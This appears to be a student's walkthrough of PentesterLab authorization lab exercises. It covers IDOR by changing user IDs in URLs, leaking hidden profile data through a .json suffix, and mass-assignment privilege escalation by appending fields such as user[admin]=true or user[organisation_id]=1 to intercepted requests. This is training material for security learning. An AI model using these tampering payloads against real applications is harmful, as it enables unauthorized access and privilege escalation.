# Authorization

Authorization or authorisation is the function of specifying access rights/privileges to resources, which is related to general information security and computer security, and to access control in particular. More formally, "to authorize" is to define an access policy.

## Authorization 01

1.In this exercise, you can log in with the following user: user1 with the password "pentesterlab". Once you logged in and have a play around, try to access the information from user2. 

2. Enter The username and password and login, notice that urls

       http://ptl-81dab144-eae93a9b.libcurl.so/user/1 
    
3. so thinks here is IDOR posible

## Authorization 02

1. In this exercise, you can log in with the following user: user1 with the password "pentesterlab". Once you logged in and have a play around, try to access the information from user2. 

2. Enter The username and password and notice that here is editon option so use edit option urls like 

       http://ptl-81dab144-eae93a9b.libcurl.so/infos/1/edit
      
3. Here is Posible is IDOR 

## Authorisation 03 

1.This exercise covers the exploitation of a vulnerability in the authorisation of a rails application.

2. Here Funtion see the profile anyone but password and some information is hide profile urls like

       http://ptl-5ee50cb9-4053c6be.libcurl.so/users/1
        
3. Check IDOR but IDOR is not posible so use json vulnerability here simple add .json option add boom hidin data is expose like

       http://ptl-5ee50cb9-4053c6be.libcurl.so/users/1.json
       

## 4. Authorization 04

1. The objective of this exercise is to find a way to register as a user with the admin privilege"...

2. You Have a login page, enter the username and password 

3. use bur-suite intercept the request and notice that the username and password submite like 

       user%5Busername%5D=asif&user%5Bpassword%5D=khan&submit=Submit+Query

4. This is decode use burp decoder use option url and decode data like 

       user[username]=asif&user[password]=khan&submit=Submit+Query

5. Add your parameter paylods like 

       user[username]=asif&user[password]=khan&submit=Submit+Query&user[admin]=true

6. Boom bypass the security and privileges
        
## Authorization 05

1. The objective of this exercise is to find a way to become a user with the admin privilege"...

2. You Have a login page, enter the username and password 

3. use bur-suite intercept the request and notice that the username and password submite like

       user%5Busername%5D=asif&user%5Bpassword%5D=khan&submit=Submit+Query         

4. This is decode use burp decoder use option url and decode data like

       user[username]=asif&user[password]=khan&submit=Submit+Query
        
5. Add your parameter paylods like    

       user[username]=asif&user[password]=khan&submit=Submit+Query&user[admin]=1

6. Boom bypass the security and privileges



## Authorization 06

1. The objective of this exercise is to find a way to get access to the organisation #1

2. You Have a Register page, Enter The Username and password and Register the account but You are not part of an organisation

3. You Recon The organisation and infotmation the user account submite like organisation_id=1 so use the option

4. Open The Burp-suite and intercept the request like

       user%5Busername%5D=papa&user%5Bpassword%5D=hello&submit=Submit+Query

5. Decode the request 

       user[username]=papa&user[password]=hello&submit=Submit+Query

7. Add Your parameter paylods likes

       user[username]=papa&user[password]=hello&submit=Submit+Query&user[organisation_id]=1
        
Decode the urls and sand the request server and boom join the organisation




